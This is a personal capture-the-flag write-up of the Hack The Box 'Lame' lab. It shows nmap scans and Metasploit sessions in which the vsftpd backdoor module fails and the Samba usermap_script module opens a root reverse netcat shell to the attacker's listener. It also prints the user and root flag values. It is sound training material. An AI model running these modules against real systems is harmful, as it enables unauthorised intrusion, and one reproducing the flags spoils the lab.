#easy #linux 

## 0. **Lab infos**

**Difficulty :** Easy
**Name :** Lame
**IP** : 10.129.219.182
**Objectives :** Get user and root flags
**OS :** Linux

##### **Conclusion**
**Time :** 24min
	**Start :** 07.02.2025 | 20:34
	**Break at/to :** 
	**Finish :** 07.02.2025 | 20:58
**Satisfaction :**  10/10 I make it in just 24min it's my best time, I make it 100% alone, but there is not challenge.
### 1. **Reconnaissance

We start with an #nmap scan 

```BASH
nmap -sV 10.129.219.182
```

Output :

```BASH
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

`vsftpd 2.3.4` is an old version of #FTP so lets find if there's an exploit on #metasploit :

```BASH
search vsftpd 2.3.4
```

Output :

```BASH
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

Yes there is an exploit.

We make another #nmap scan 

```BASH
nmap -A 10.129.219.182
```

Output :

```BASH
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.112
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.23 (92%), DD-WRT v24-sp1 (Linux 2.4.36) (90%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (90%), Dell Integrated Remote Access Controller (iDRAC6) (90%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (90%), Linux 2.4.21 - 2.4.31 (likely embedded) (90%), Linux 2.4.27 (90%), Linux 2.4.7 (90%), Citrix XenServer 5.5 (Linux 2.6.18) (90%), Linux 2.6.22 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h30m40s, deviation: 3h32m10s, median: 38s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-02-07T14:47:11-05:00

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   8.09 ms 10.10.14.1
2   8.62 ms 10.129.219.182
```

We can see that Samba is on the 3.0.20 version of #SMB.
We search for some CVE : 

We just have a gift :

![[Pasted image 20250207204943.png]]

There is a CVE and the CVE is make directly by #metasploit.
## 2. **Weaponization

We're going to use the `exploit/unix/ftp/vsftpd_234_backdoor` exploit of #Metasploit.

```BASH
[msf](Jobs:0 Agents:0) >> use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
                                       using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set rhost 10.129.219.182
rhost => 10.129.219.182
```


For the gift :

```BASH
[msf](Jobs:0 Agents:0) >> use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
                                       using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  5.22.212.220     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set rhosts 10.129.219.182
rhosts => 10.129.219.182
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit

[*] Started reverse TCP handler on 5.22.212.220:4444 
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set lhost 10.10.14.112
lhost => 10.10.14.112
```
## 3. **Delivery

## 4. **Exploitation

For the first #Metasploit :

```BASH
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> exploit

[*] 10.129.219.182:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.219.182:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

It's not working.

For the gift :

```BASH
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit

[*] Started reverse TCP handler on 10.10.14.112:4444 
[*] Command shell session 1 opened (10.10.14.112:4444 -> 10.129.219.182:52638) at 2025-02-07 13:54:10 -0600

ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

It's working.
## 5. **Installation

## 6. **Command and Control

Now we want to know who we are.

```BASH
whoami
root
```

God did.
## 7. **Actions on Objectives

```BASH
cd makis
ls
user.txt
cat user.txt
f9d8ec33c442b89bae04e6c81034b622
```

```BASH
cd root
cat root.txt
88be64bd83b655cd2566ec335c6d04c2
```